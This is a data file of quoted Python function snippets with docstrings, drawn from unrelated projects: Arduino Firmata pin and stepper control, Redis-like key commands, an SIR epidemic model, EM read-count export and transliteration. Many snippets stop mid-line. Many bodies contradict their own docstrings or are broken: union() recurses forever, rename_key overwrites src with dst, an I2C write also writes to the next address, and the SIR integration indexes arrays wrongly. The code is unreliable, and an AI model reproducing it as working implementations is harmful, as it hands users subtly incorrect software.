        "def map_pin(self, abstract_pin_id, physical_pin_id):\n        \"\"\"Maps a pin number to a physical device pin.\n\n        To make it easy to change drivers without having to refactor a lot of\n        code, this library does not use the names set by the driver to identify\n        a pin. This function will map a number, that will be used by other\n        functions, to a physical pin represented by the drivers pin id. That\n        way, if you need to use another pin or change the underlying driver\n        completly, you only need to redo the mapping.\n\n        If you're developing a driver, keep in mind that your driver will not\n        know about this. The other functions will translate the mapped pin to\n        your id before calling your function.\n\n        @arg abstract_pin_id the id that will identify this pin in the\n        other function calls. You",
        "def set_pin_direction(self, pin, direction):\n        \"\"\"Sets pin `pin` to `direction`.\n\n        The pin should support the requested mode. Calling this function\n        on a unmapped pin does nothing. Calling it with a unsupported direction\n        throws RuntimeError.\n\n        If you're developing a driver, you should implement\n        _set_pin_direction(self, pin, direction) where `pin` will be one of\n        your internal IDs. If a pin is set to OUTPUT, put it on LOW state.\n\n        @arg pin pin id you've set using `AbstractDriver.map_pin`\n        @arg mode a value from `AbstractDriver.Direction`\n\n        @throw KeyError if pin isn't mapped.\n        @throw RuntimeError if direction is not supported by pin.\n        \"\"\"\n        if pin not in self._pin_map:\n            raise KeyError(\"Pin",
        "def _pin_direction(self, pin):\n        \"\"\"\n        Gets the `ahio.Direction` this pin was set to.\n\n        If you're developing a driver, implement _pin_direction(self, pin)\n\n        @arg pin the pin you want to see the mode\n        @returns the `ahio.Direction` the pin is set to\n\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if pin not in self._pin_map:\n            raise KeyError(\"Pin %s is not mapped\" % pin)\n        return self._pin_map[pin].direction",
        "def set_pin_type(self, pin, type):\n        \"\"\"Sets pin `pin` to `type`.\n\n        The pin should support the requested mode. Calling this function\n        on a unmapped pin does nothing. Calling it with a unsupported mode\n        throws RuntimeError.\n\n        If you're developing a driver, you should implement\n        _set_pin_type(self, pin, ptype) where `pin` will be one of your\n        internal IDs. If a pin is set to OUTPUT, put it on LOW state.\n\n        @arg pin pin id you've set using `AbstractDriver.map_pin`\n        @arg mode a value from `AbstractDriver.PortType`\n\n        @throw KeyError if pin isn't mapped.\n        @throw RuntimeError if type is not supported by pin.\n        \"\"\"\n        if pin not in self._pin_map:\n            raise KeyError(\"Pin",
        "def port_type(self, pin):\n        \"\"\"\n        Gets the `ahio.PortType` this pin was set to.\n\n        If you're developing a driver, implement _pin_type(self, pin)\n\n        @arg pin the pin you want to see the mode\n        @returns the `ahio.PortType` the pin is set to\n\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if pin not in self._pin_map:\n            raise KeyError(\"pin %s not mapped\" % pin)\n        return self._pin_map[pin].port_type",
        "def write(self, pin, value, pwm=False):\n        \"\"\"Sets the output to the given value.\n\n        Sets `pin` output to given value. If the pin is in INPUT mode, do\n        nothing. If it's an analog pin, value should be in write_range.\n        If it's not in the allowed range, it will be clamped. If pin is in\n        digital mode, value can be `ahio.LogicValue` if `pwm` = False, or a\n        number between 0 and 1 if `pwm` = True. If PWM is False, the pin will\n        be set to HIGH or LOW, if `pwm` is True, a PWM wave with the given\n        cycle will be created. If the pin does not support PWM and `pwm` is\n        True, raise RuntimeError. The `pwm` argument should be ignored in case",
        "def read(self, pin):\n        \"\"\"\n        Reads value from pin `pin`.\n\n        Returns the value read from pin `pin`. If it's an analog pin, returns\n        a number in analog.input_range. If it's digital, returns\n        `ahio.LogicValue`.\n\n        If you're developing a driver, implement _read(self, pin)\n\n        @arg pin the pin to read from\n        @returns the value read from the pin\n\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if pin not in self.pins:\n            raise KeyError(\"pin %s not mapped\" % pin)\n        if self.pins[pin].type == \"analog\":\n            return self.analog.input_range[pin]\n        elif self.pins[pin].type == \"digital\":\n            return self.digital.input",
        "def set_analog_reference(self, reference, pin=None):\n        \"\"\"Sets the analog reference to `reference`\n\n        If the driver supports per pin reference setting, set pin to the\n        desired reference. If not, passing None means set to all, which is the\n        default in most hardware. If only per pin reference is supported and\n        pin is None, raise RuntimeError.\n\n        If you're developing a driver, implement\n        _set_analog_reference(self, reference, pin). Raise RuntimeError if pin\n        was set but is not supported by the platform.\n\n        @arg reference the value that describes the analog reference. See\n            `AbstractDriver.analog_references`\n        @arg pin if the the driver supports it, the pin that will use\n            `reference` as reference. None for all.\n\n        @throw RuntimeError if pin is None on a per pin",
        "def analog_reference(self, pin=None):\n        \"\"\"Returns the analog reference.\n\n        If the driver supports per pin analog reference setting, returns the\n        reference for pin `pin`. If pin is None, returns the global analog\n        reference. If only per pin reference is supported and pin is None,\n        raise RuntimeError.\n\n        If you're developing a driver, implement _analog_reference(self, pin)\n\n        @arg pin if the the driver supports it, the pin that will use\n            `reference` as reference. None for all.\n\n        @returns the reference used for pin\n\n        @throw RuntimeError if pin is None on a per pin only hardware, or if\n            it's a valid pin on a global only analog reference hardware.\n        @throw KeyError if pin isn't mapped.\n        \"\"\"\n        if pin is None:\n            return self._analog_reference",
        "def set_pwm_frequency(self, frequency, pin=None):\n        \"\"\"Sets PWM frequency, if supported by hardware\n\n        If the driver supports per pin frequency setting, set pin to the\n        desired frequency. If not, passing None means set to all. If only per\n        pin frequency is supported and pin is None, raise RuntimeError.\n\n        If you're developing a driver, implement\n        _set_pwm_frequency(self, frequency, pin). Raise RuntimeError if pin\n        was set but is not supported by the platform.\n\n        @arg frequency pwm frequency to be set, in Hz\n        @arg pin if the the driver supports it, the pin that will use\n            `frequency` as pwm frequency. None for all/global.\n\n        @throw RuntimeError if pin is None on a per pin only hardware, or if\n            it's a valid pin on a global only hardware",
        "def integrate_sir(y0, time, beta, gamma):\n    \"\"\"Integrate SIR epidemic model\n\n    Simulate a very basic deterministic SIR system.\n\n    :param 2x1 numpy array y0: initial conditions\n    :param Ntimestep length numpy array time: Vector of time points that \\\n    solution is returned at\n    :param float beta: transmission rate\n    :param float gamma: recovery rate\n\n    :returns: (2)x(Ntimestep) numpy array Xsim: first row S(t), second row I(t)\n    \"\"\"\n    # Initialize variables\n    S = np.zeros((2, time.shape[0]))\n    I = np.zeros((2, time.shape[1]))\n\n    # Integrate\n    for t in range(time.shape[0]):\n        S[t, t]",
        "def url(self):\n        \"\"\"Return the URL of the server.\n\n        :returns: URL of the server\n        :rtype: string\n        \"\"\"\n        if self._url is None:\n            self._url = self._get_url()\n        return self._url",
        "def _numpy_memory_estimate():\n    \"\"\"Returns an estimate for the maximum amount of memory to be consumed by numpy arrays.\"\"\"\n    try:\n        import numpy as np\n    except ImportError:\n        return 0\n    try:\n        return np.memory_info()[0]\n    except AttributeError:\n        return 0",
        "def coverage_report(self):\n        \"\"\"Create coverage reports and open them in the browser.\"\"\"\n        self.coverage_report_dir = os.path.join(self.build_dir, 'coverage')\n        if not os.path.exists(self.coverage_report_dir):\n            os.makedirs(self.coverage_report_dir)\n        self.coverage_report_file = os.path.join(self.coverage_report_dir, 'coverage.html')\n        self.coverage_report_file = os.path.join(self.coverage_report_dir, 'coverage.html.gz')\n        self.coverage_report_file = os.path.join(self.coverage_report_dir, 'coverage.html')\n        self.coverage_report_file = os.path.join(self.coverage_report_dir, 'coverage.html.bz",
        "def start(self, configuration=None, **kwargs):\n        \"\"\"Start a Modbus server.\n\n        The following classes are available with their respective named\n        parameters:\n        \n        ModbusTcpClient\n            host: The host to connect to (default 127.0.0.1)\n            port: The modbus port to connect to (default 502)\n            source_address: The source address tuple to bind to (default ('', 0))\n            timeout: The timeout to use for this socket (default Defaults.Timeout)\n\n        ModbusUdpClient\n            host: The host to connect to (default 127.0.0.1)\n            port: The modbus port to connect to (default 502)\n            timeout: The timeout to use for this socket (default None)\n\n        ModbusSerialClient\n            method: The method to use for connection (asii, rtu,",
        "def exception(status_code, error_code, value):\n    \"\"\"Return an exception given status and error codes.\n\n    :param status_code: HTTP status code.\n    :type status_code: None | int\n    :param error_code: Midas Server error code.\n    :type error_code: None | int\n    :param value: Message to display.\n    :type value: string\n    :returns: Exception.\n    :rtype : pydas.exceptions.ResponseError\n    \"\"\"\n\n    if error_code is None:\n        error_code = status_code\n\n    return exceptions.ResponseError(error_code, value)",
        "def get_last_analog_data(self, pin):\n        \"\"\"\n        Retrieve the last analog data value received for the specified pin.\n\n        :param pin: Selected pin\n\n        :return: The last value entered into the analog response table.\n        \"\"\"\n        pin = self._get_pin(pin)\n        return self._analog_data[pin]",
        "def disable_analog_reporting(self, pin):\n        \"\"\"\n        Disables analog reporting for a single analog pin.\n\n        :param pin: Analog pin number. For example for A0, the number is 0.\n\n        :return: No return value\n        \"\"\"\n        self._analog_reporting[pin] = False\n        self._analog_reporting_count[pin] = 0",
        "def disable_digital_reporting(self, pin):\n        \"\"\"\n        Disables digital reporting. By turning reporting off for this pin, reporting\n        is disabled for all 8 bits in the \"port\" -\n\n        :param pin: Pin and all pins for this port\n\n        :return: No return value\n        \"\"\"\n        self._digital_reporting_enabled = False\n        self._digital_reporting_pin = pin",
        "def enable_analog_reporting(self, pin):\n        \"\"\"\n        Enables analog reporting. By turning reporting on for a single pin.\n\n        :param pin: Analog pin number. For example for A0, the number is 0.\n\n        :return: No return value\n        \"\"\"\n        self._analog_reporting_enabled = True\n        self._analog_reporting_pin = pin",
        "def enable_digital_reporting(self, pin):\n        \"\"\"\n        Enables digital reporting. By turning reporting on for all 8 bits in the \"port\" -\n        this is part of Firmata's protocol specification.\n\n        :param pin: Pin and all pins for this port\n\n        :return: No return value\n        \"\"\"\n        self._write8(self.PORT_REPORT, pin)\n        self._write8(self.PORT_REPORT, 0)",
        "def write_extended_data_analog(self, pin, data):\n        \"\"\"\n        This method will send an extended data analog output command to the selected pin\n\n        :param pin: 0 - 127\n\n        :param data: 0 - 0xfffff\n        \"\"\"\n        self.write_analog(pin, data, 0)",
        "def get_version(self, timeout=None):\n        \"\"\"\n        Get the stepper library version number.\n\n        :param timeout: specify a time to allow arduino to process and return a version\n\n        :return: the stepper version number if it was set.\n        \"\"\"\n        if timeout is None:\n            timeout = self.timeout\n        if self.version is None:\n            self.version = self.get_version_async(timeout)\n        return self.version",
        "def write(self, address, *args):\n        \"\"\"Write data to an i2c device.\n\n        :param address: i2c device address\n\n        :param args: A variable number of bytes to be sent to the device\n        \"\"\"\n        self._write_data(address, args)\n        self._write_data(address + 1, args)",
        "def stop_i2c_read_continuously(self, address):\n        \"\"\"\n        This method stops an I2C_READ_CONTINUOUSLY operation for the i2c device address specified.\n\n        :param address: address of i2c device\n        \"\"\"\n        self.stop_i2c_read(address)\n        self.i2c_read_continuously_event.set()",
        "def tone(self, pin, tone_command, frequency, duration):\n        \"\"\"\n        This method will call the Tone library for the selected pin.\n        If the tone command is set to TONE_TONE, then the specified tone will be played.\n        Else, if the tone command is TONE_NO_TONE, then any currently playing tone will be disabled.\n        It is intended for a future release of Arduino Firmata\n\n        :param pin: Pin number\n\n        :param tone_command: Either TONE_TONE, or TONE_NO_TONE\n\n        :param frequency: Frequency of tone in hz\n\n        :param duration: Duration of tone in milliseconds\n\n        :return: No return value\n        \"\"\"\n        if tone_command == TONE_TONE:\n            self.tone_tone(pin, frequency, duration)",
        "def latch_analog_pin(self, pin, threshold_type, threshold_value, cb=None):\n        \"\"\"\n        This method \"arms\" an analog pin for its data to be latched and saved in the latching table\n        If a callback method is provided, when latching criteria is achieved, the callback function is called\n        with latching data notification. In that case, the latching table is not updated.\n\n        :param pin: Analog pin number (value following an 'A' designator, i.e. A5 = 5\n\n        :param threshold_type: ANALOG_LATCH_GT | ANALOG_LATCH_LT  | ANALOG_LATCH_GTE | ANALOG_LATCH_LTE\n\n        :param threshold_value: numerical value - between 0 and 1023\n\n        :param cb: callback method\n\n        :return: True",
        "def digital_latch(self, pin, threshold_type, cb=None):\n        \"\"\"\n        This method \"arms\" a digital pin for its data to be latched and saved in the latching table\n        If a callback method is provided, when latching criteria is achieved, the callback function is called\n        with latching data notification. In that case, the latching table is not updated.\n\n        :param pin: Digital pin number\n\n        :param threshold_type: DIGITAL_LATCH_HIGH | DIGITAL_LATCH_LOW\n\n        :param cb: callback function\n\n        :return: True if successful, False if parameter data is invalid\n        \"\"\"\n        if threshold_type == DIGITAL_LATCH_HIGH:\n            self.digital_latch_high(pin, cb)\n        elif threshold_type == DIGITAL_LATCH_LOW",
        "def servo_pin_set_pulse(self, pin, min_pulse, max_pulse):\n        \"\"\"\n        Configure a pin as a servo pin. Set pulse min, max in ms.\n\n        :param pin: Servo Pin.\n\n        :param min_pulse: Min pulse width in ms.\n\n        :param max_pulse: Max pulse width in ms.\n\n        :return: No return value\n        \"\"\"\n        self._servo_pin_set_pulse(pin, min_pulse, max_pulse, True)",
        "def stepper_config(self, steps_per_revolution, stepper_pins):\n        \"\"\"Configure stepper motor prior to operation.\n\n        :param steps_per_revolution: number of steps per motor revolution\n\n        :param stepper_pins: a list of control pin numbers - either 4 or 2\n        \"\"\"\n        stepper_pins = list(stepper_pins)\n        stepper_pins.append(4)\n        stepper_pins.append(2)\n        self.stepper_pins = stepper_pins\n        self.stepper_steps_per_revolution = steps_per_revolution\n        self.stepper_steps_per_revolution_max = steps_per_revolution * 2\n        self.stepper_steps_per_revolution_min = steps_per_revolution *",
        "def stepper_motor(self, motor_speed, number_of_steps):\n        \"\"\"\n        Move a stepper motor for the number of steps at the specified speed\n\n        :param motor_speed: 21 bits of data to set motor speed\n\n        :param number_of_steps: 14 bits for number of steps & direction\n                                positive is forward, negative is reverse\n        \"\"\"\n        self._set_data(\n            motor_speed,\n            (number_of_steps >> 5) & 0x1f,\n            (number_of_steps >> 4) & 0x1f,\n            (number_of_steps & 0x1f) & 0x1f\n        )",
        "def get_stepper_version(self):\n        \"\"\"\n        Request the stepper library version from the Arduino.\n        To retrieve the version after this command is called, call\n        get_stepper_version\n        \"\"\"\n        self.write_byte(CMD_GET_STEPPER_VERSION)\n        response = self.read_byte()\n        if response != CMD_GET_STEPPER_VERSION:\n            raise StepperError(\"Failed to get stepper library version\")\n        return response",
        "def open(self, baudrate=115200, timeout=1):\n        \"\"\"\n        open the serial port using the configuration data\n        returns a reference to this instance\n        \"\"\"\n        self.baudrate = baudrate\n        self.timeout = timeout\n        self.port = serial.Serial(self.baudrate, self.timeout)\n        return self",
        "def _read_char(self):\n        \"\"\"\n        This method continually runs. If an incoming character is available on the serial port\n        it is read and placed on the _command_deque\n        @return: Never Returns\n        \"\"\"\n        try:\n            char = self.serial.read(1)\n            if char:\n                self._command_deque.append(char)\n        except serial.SerialException:\n            pass",
        "def set_brightness(self, brightness):\n        \"\"\"\n        Set the brightness level for the entire display\n        @param brightness: brightness level (0 -15)\n        \"\"\"\n        self.set_bit(self.BRIGHTNESS, brightness)\n        self.set_bit(self.BRIGHTNESS_R, brightness)\n        self.set_bit(self.BRIGHTNESS_G, brightness)\n        self.set_bit(self.BRIGHTNESS_B, brightness)",
        "def draw(self, shape, color):\n        \"\"\"\n        Populate the bit map with the supplied \"shape\" and color\n        and then write the entire bitmap to the display\n        @param shape: pattern to display\n        @param color: color for the pattern\n        \"\"\"\n        self.bitmap = self.bitmap.copy()\n        self.bitmap.fill(color)\n        self.draw_shape(shape)\n        self.write_to_display()",
        "def display(self):\n        \"\"\"Write the entire buffer to the display\"\"\"\n        for line in self.buffer:\n            self.display_line(line)",
        "def led_off(self):\n        \"\"\"Set all led's to off.\"\"\"\n        for led in self.leds:\n            led.set(False)",
        "def digital_message(self, data):\n        \"\"\"\n        This method handles the incoming digital message.\n        It stores the data values in the digital response table.\n        Data is stored for all 8 bits of a  digital port\n\n        :param data: Message data from Firmata\n\n        :return: No return value.\n        \"\"\"\n        if data[0] == 0x00:\n            # Digital port 0\n            self.digital_response_table[data[1]] = data[2]\n        elif data[0] == 0x01:\n            # Digital port 1\n            self.digital_response_table[data[1]] = data[2]\n        elif data[0] == 0x02:\n            # Digital port 2\n            self.digital_response_table[data[1]] = data[2]\n        elif data[0] == 0",
        "def _handle_encoder_data(self, data):\n        \"\"\"This method handles the incoming encoder data message and stores\n        the data in the digital response table.\n\n        :param data: Message data from Firmata\n\n        :return: No return value.\n        \"\"\"\n        if data[0x00] == 0x00:\n            # No data, just return\n            return\n\n        if data[0x00] == 0x01:\n            # Data is a digital response\n            self._digital_response_table[data[0x01]] = data[0x02]\n\n        if data[0x00] == 0x02:\n            # Data is a digital response\n            self._digital_response_table[0x00] = 0x00\n\n        if data[0x00] == 0x03:\n            # Data is a digital response\n           ",
        "def _handle_sonar_data(self, data):\n        \"\"\"This method handles the incoming sonar data message and stores\n        the data in the response table.\n\n        :param data: Message data from Firmata\n\n        :return: No return value.\n        \"\"\"\n        if data.get_type() == SONAR_DATA_TYPE.DATA_REQUEST:\n            self._handle_data_request(data)\n        elif data.get_type() == SONAR_DATA_TYPE.DATA_RESPONSE:\n            self._handle_data_response(data)\n        else:\n            raise ValueError(\"Invalid sonar data type\")",
        "def send_sysex_command(self, sysex_command, sysex_data):\n        \"\"\"\n        This method will send a Sysex command to Firmata with any accompanying data\n\n        :param sysex_command: sysex command\n\n        :param sysex_data: data for command\n\n        :return : No return value.\n        \"\"\"\n        self.send_command(sysex_command, sysex_data)",
        "def _send_command(self, command):\n        \"\"\"\n        This method is used to transmit a non-sysex command.\n\n        :param command: Command to send to firmata includes command + data formatted by caller\n\n        :return : No return value.\n        \"\"\"\n        if self.is_connected:\n            self.write_data(command)\n            self.read_data()",
        "def reset(self):\n        \"\"\"\n        Send the reset command to the Arduino.\n        It resets the response tables to their initial values\n\n        :return: No return value\n        \"\"\"\n        self.write(self.RESET_CMD)\n        self.read_until(self.RESET_CMD, self.RESET_CMD_RESP)",
        "def _handle_string_data(self, data):\n        \"\"\"\n        This method handles the incoming string data message from Firmata.\n        The string is printed to the console\n\n        :param data: Message data from Firmata\n\n        :return: No return value.s\n        \"\"\"\n        if data is None:\n            return\n\n        if data[0] == 0x00:\n            # Printing the string\n            print(data[1:])\n\n        elif data[0] == 0x01:\n            # Printing the string\n            print(data[1:])\n\n        elif data[0] == 0x02:\n            # Printing the string\n            print(data[1:])\n\n        elif data[0] == 0x03:\n            # Printing the string\n            print(data[1:])\n\n        elif data[",
        "def start(self):\n        \"\"\"This method starts the thread that continuously runs to receive and interpret\n        messages coming from Firmata. This must be the last method in this file\n        It also checks the deque for messages to be sent to Firmata.\n        \"\"\"\n        self.thread = threading.Thread(target=self.receive_loop)\n        self.thread.daemon = True\n        self.thread.start()",
        "def fetch(self, url, **kwargs):\n        \"\"\"Use requests to fetch remote content\"\"\"\n        return self.session.get(url, **kwargs)",
        "def _combine_image_urls(self, finder_image_urls, extender_image_urls):\n        \"\"\"\n        Combine finder_image_urls and extender_image_urls,\n        remove duplicate but keep order\n        \"\"\"\n        finder_image_urls = list(finder_image_urls)\n        extender_image_urls = list(extender_image_urls)\n        extender_image_urls.sort()\n        finder_image_urls.sort()\n        return finder_image_urls, extender_image_urls",
        "def find_image_url(element):\n    \"\"\"Find image URL in background-image\n\n    Example:\n    <div style=\"width: 100%; height: 100%; background-image: url(http://distilleryimage10.ak.instagram.com/bde04558a43b11e28e5d22000a1f979a_7.jpg);\" class=\"Image iLoaded iWithTransition Frame\" src=\"http://distilleryimage10.ak.instagram.com/bde04558a43b11e28e5d22000a1f979a_7.jpg\"></div>\n    to\n    http://distilleryimage10.ak.instagram.com/bde04558a43b11e28e5d22000a1f979a_7.jpg\n    \"\"\"\n    if element.",
        "def get_node_name(self, name):\n        \"\"\"Return the node name where the ``name`` would land to\"\"\"\n        if name in self.nodes:\n            return self.nodes[name]\n        else:\n            raise KeyError(\"Node %r not in %r\" % (name, self.nodes))",
        "def get_node(self, name):\n        \"\"\"Return the node where the ``name`` would land to\"\"\"\n        for node in self.nodes:\n            if node.name == name:\n                return node",
        "def get_key_info(self, key):\n        \"\"\"Return the encoding, idletime, or refcount about the key\"\"\"\n        if key in self.cache:\n            return self.cache[key]\n        if self.idletime is not None:\n            return self.idletime, self.refcount\n        if self.refcount is not None:\n            return self.refcount, self.encoding\n        return None, None, None",
        "def zpop(self, src, dst, timeout=None):\n        \"\"\"Pop a value off the tail of ``src``, push it on the head of ``dst``\n        and then return it.\n\n        This command blocks until a value is in ``src`` or until ``timeout``\n        seconds elapse, whichever is first. A ``timeout`` value of 0 blocks\n        forever.\n        Not atomic\n        \"\"\"\n        return self.execute_command('ZPOP', src, dst, timeout=timeout)",
        "def rpop(self, src, dst):\n        \"\"\"RPOP a value off of the ``src`` list and LPUSH it\n        on to the ``dst`` list.  Returns the value.\n        \"\"\"\n        return self.execute_command('RPOP', src, dst)",
        "def srem(self, key, src, dst):\n        \"\"\"Move ``value`` from set ``src`` to set ``dst``\n        not atomic\"\"\"\n        return self.execute_command('SREM', key, src, dst)",
        "def union(self, *args):\n        \"\"\"\n        Returns the members of the set resulting from the union between\n        the first set and all the successive sets.\n        \"\"\"\n        if len(args) == 0:\n            return self\n        else:\n            return self.__class__(self.union(*args))",
        "def sunionstore(self, src, dest, *args):\n        \"\"\"\n        Store the union of sets ``src``,  ``args`` into a new\n        set named ``dest``.  Returns the number of keys in the new set.\n        \"\"\"\n        return self.execute_command('SUNIONSTORE', src, dest, *args)",
        "def _set_mapping(self, mapping):\n        \"\"\"\n        Sets each key in the ``mapping`` dict to its corresponding value if\n        none of the keys are already set\n        \"\"\"\n        for key, value in mapping.items():\n            if key not in self.mapping:\n                self.mapping[key] = value",
        "def rename(self, src, dst):\n        \"\"\"Rename key ``src`` to ``dst``\"\"\"\n        self.execute(b'RENAME', src, dst)",
        "def rename_key(self, src, dst):\n        \"\"\"Rename key ``src`` to ``dst`` if ``dst`` doesn't already exist\"\"\"\n        if not self.exists(src):\n            self.create(src)\n        if not self.exists(dst):\n            self.create(dst)\n        self.set(src, dst)",
        "def keys(self, pattern):\n        \"\"\"Returns a list of keys matching ``pattern``\"\"\"\n        return [k for k in self.keys_iter(pattern) if k in self.data]",
        "def count(self):\n        \"\"\"\n        Returns the number of keys in the current database\n        \"\"\"\n        return self.db.execute(self.select_query).fetchone()[0]",
        "def _prepare_date(self, date):\n        \"\"\"Prepare the date in the instance state for serialization.\"\"\"\n        if date is None:\n            return None\n        if isinstance(date, datetime):\n            return date.isoformat()\n        return date",
        "def verify_signature(xml, stream):\n    \"\"\"\n    Verify the signaure of an XML document with the given certificate.\n    Returns `True` if the document is signed with a valid signature.\n    Returns `False` if the document is not signed or if the signature is\n    invalid.\n\n    :param lxml.etree._Element xml: The document to sign\n    :param file stream: The private key to sign the document with\n\n    :rtype: Boolean\n    \"\"\"\n    try:\n        signature = _get_signature(xml, stream)\n    except Exception as e:\n        log.exception(e)\n        return False\n\n    if signature is None:\n        return False\n\n    try:\n        signature_data = _get_signature_data(signature)\n    except Exception as e:\n        log.exception(e)\n        return False\n\n   ",
        "def add_photos(self, photos):\n        \"\"\"Add number of photos to each gallery.\"\"\"\n        for gallery in self.galleries:\n            gallery.add_photos(photos)",
        "def set_author(self, user):\n        \"\"\"Set currently authenticated user as the author of the gallery.\"\"\"\n        self.author = user\n        self.author_id = user.id\n        self.author_name = user.name\n        self.author_email = user.email",
        "def set_photo_author(self, photos):\n        \"\"\"\n        For each photo set it's author to currently authenticated user.\n        \"\"\"\n        for photo in photos:\n            photo.author = self.user.username",
        "def _get_ranges(self, rfc, start=None, end=None):\n        \"\"\"\n        Outputs a list of tuples with ranges or the empty list\n        According to the rfc, start or end values can be omitted\n        \"\"\"\n        if rfc == 'rfc1952':\n            return self._get_rfc1952_ranges(start, end)\n        elif rfc == 'rfc1953':\n            return self._get_rfc1953_ranges(start, end)\n        elif rfc == 'rfc1954':\n            return self._get_rfc1954_ranges(start, end)\n        elif rfc == 'rfc1955':\n            return self._get_rfc1955_ranges(start, end)\n        elif rfc == 'rfc1956':\n            return self._get_rfc1956_ranges(start, end)\n        elif rfc == 'rfc1957':\n",
        "def _remove_errored_ranges(self):\n        \"\"\"Removes errored ranges\"\"\"\n        for i in range(len(self.ranges)):\n            if self.ranges[i][1] < self.ranges[i - 1][0]:\n                self.ranges.pop(i)",
        "def _byte_ranges(self, ranges):\n        \"\"\"Converts to valid byte ranges\"\"\"\n        if ranges is None:\n            return ranges\n        if isinstance(ranges, six.string_types):\n            ranges = [ranges]\n        return [self._byte_range(r) for r in ranges]",
        "def _sort_overlaps(self, overlaps):\n        \"\"\"Sorts and removes overlaps\"\"\"\n        overlaps.sort(key=lambda x: x.start, reverse=True)\n        overlaps.remove(overlaps[0])",
        "def social_widget_render(widget_template, **kwargs):\n    \"\"\"\n    Renders the selected social widget. You can specify optional settings\n    that will be passed  to widget template.\n\n    Sample usage:\n    {% social_widget_render widget_template ke1=val1 key2=val2 %}\n\n    For example to render Twitter follow button you can use code like this:\n    {% social_widget_render 'twitter/follow_button.html' username=\"ev\" %}\n    \"\"\"\n    widget = get_object_or_404(SocialWidget, template=widget_template)\n    kwargs.update({'widget': widget})\n    return render_to_response(widget.template, kwargs)",
        "def add_addend(self, addend_mat, axis=0):\n        \"\"\"\n        In-place addition\n\n        :param addend_mat: A matrix to be added on the Sparse3DMatrix object\n        :param axis: The dimension along the addend_mat is added\n        :return: Nothing (as it performs in-place operations)\n        \"\"\"\n        if axis == 0:\n            self.data += addend_mat.data\n            self.indices += addend_mat.indices\n            self.data_shape += addend_mat.data_shape\n        else:\n            self.data += addend_mat.data[:, axis]\n            self.indices += addend_mat.indices[:, axis]\n            self.data_shape += addend_mat.data_shape[:, axis]\n        return",
        "def _mul_inplace(self, multiplier, axis):\n        \"\"\"\n        In-place multiplication\n\n        :param multiplier: A matrix or vector to be multiplied\n        :param axis: The dim along which 'multiplier' is multiplied\n        :return: Nothing (as it performs in-place operations)\n        \"\"\"\n        if isinstance(multiplier, np.ndarray):\n            multiplier = np.asarray(multiplier)\n        if axis == 0:\n            self.data *= multiplier\n        else:\n            self.data *= multiplier[:, axis]",
        "def update_probability_read_origin(self, model):\n        \"\"\"\n        Updates the probability of read origin at read level\n\n        :param model: Normalization model (1: Gene->Allele->Isoform, 2: Gene->Isoform->Allele, 3: Gene->Isoform*Allele, 4: Gene*Isoform*Allele)\n        :return: Nothing (as it performs in-place operations)\n        \"\"\"\n        if model == 1:\n            self.probability_read_origin = self.probability_read_origin_1\n        elif model == 2:\n            self.probability_read_origin = self.probability_read_origin_2\n        elif model == 3:\n            self.probability_read_origin = self.probability_read_origin_3\n        elif model == 4:\n            self.probability_read_origin = self.probability",
        "def run(self, model=1, tol=1e-5, max_iters=1000, verbose=False):\n        \"\"\"\n        Runs EM iterations\n\n        :param model: Normalization model (1: Gene->Allele->Isoform, 2: Gene->Isoform->Allele, 3: Gene->Isoform*Allele, 4: Gene*Isoform*Allele)\n        :param tol: Tolerance for termination\n        :param max_iters: Maximum number of iterations until termination\n        :param verbose: Display information on how EM is running\n        :return: Nothing (as it performs in-place operations)\n        \"\"\"\n        if verbose:\n            print(\"Running EM...\")\n        if model == 1:\n            self.run_one_gene()\n        elif model == 2:\n            self.run_two_gene()\n        elif model ==",
        "def export_expected_read_counts(self, filename, grp_wise=False, reorder=False):\n        \"\"\"\n        Exports expected read counts\n\n        :param filename: File name for output\n        :param grp_wise: whether the report is at isoform level or gene level\n        :param reorder: whether the report should be either 'decreasing' or 'increasing' order or just 'as-is'\n        :return: Nothing but the method writes a file\n        \"\"\"\n        if grp_wise:\n            expected_read_counts = self.expected_read_counts_isoform\n        else:\n            expected_read_counts = self.expected_read_counts_gene\n        if reorder:\n            expected_read_counts = expected_read_counts.reorder()\n        with open(filename, 'w') as f:\n            f.write(str(",
        "def export_expected_depths(self, filename, grp_wise=False, reorder=False):\n        \"\"\"\n        Exports expected depths\n\n        :param filename: File name for output\n        :param grp_wise: whether the report is at isoform level or gene level\n        :param reorder: whether the report should be either 'decreasing' or 'increasing' order or just 'as-is'\n        :return: Nothing but the method writes a file\n        \"\"\"\n        if grp_wise:\n            expected_depths = self.expected_depths_grp_wise\n        else:\n            expected_depths = self.expected_depths_gene\n        if reorder:\n            expected_depths = sorted(expected_depths, key=lambda x: x[1])\n        else:\n            expected_depths = sorted(expected_depths)\n       ",
        "def write_posterior_probability(self, filename, title):\n        \"\"\"\n        Writes the posterior probability of read origin\n\n        :param filename: File name for output\n        :param title: The title of the posterior probability matrix\n        :return: Nothing but the method writes a file in EMASE format (PyTables)\n        \"\"\"\n        # Write the posterior probability matrix\n        with open(filename, 'w') as f:\n            f.write(self.posterior_probability_matrix)\n\n        # Write the title\n        f.write('\\n')\n        f.write(title)",
        "def print_read_wanted(self):\n        \"\"\"Prints nonzero rows of the read wanted\"\"\"\n        print(\"Read wanted:\")\n        for row in self.read_wanted:\n            print(\"{0:>5} {1:>5} {2:>5}\".format(row[0], row[1], row[2]))",
        "def roman_transliterate(data, scheme_map):\n  \"\"\"\n  Transliterate `data` with the given `scheme_map`. This function is used\n  when the source scheme is a Roman scheme.\n\n  :param data: the data to transliterate\n  :param scheme_map: a dict that maps between characters in the old scheme\n                     and characters in the new scheme\n  \"\"\"\n  if len(data) == 0:\n    return data\n\n  if len(data) == 1:\n    return data[0]\n\n  if len(data) == 2:\n    return data[0] + data[1]\n\n  if len(data) == 3:\n    return data[0] + data[1] + data[2]\n\n  if len(data) == 4:\n    return data[0] + data[1] + data[",
        "def _brahmic_transliterate(data, scheme_map):\n  \"\"\"\n  Transliterate `data` with the given `scheme_map`. This function is used\n  when the source scheme is a Brahmic scheme.\n\n  :param data: the data to transliterate\n  :param scheme_map: a dict that maps between characters in the old scheme\n                     and characters in the new scheme\n  \"\"\"\n  if not data:\n    return data\n\n  if len(data) == 1:\n    return data[0]\n\n  if len(data) == 2:\n    return data[0] + data[1]\n\n  if len(data) == 3:\n    return data[0] + data[1] + data[2]\n\n  if len(data) == 4:\n    return data[0] + data[1] + data[2",
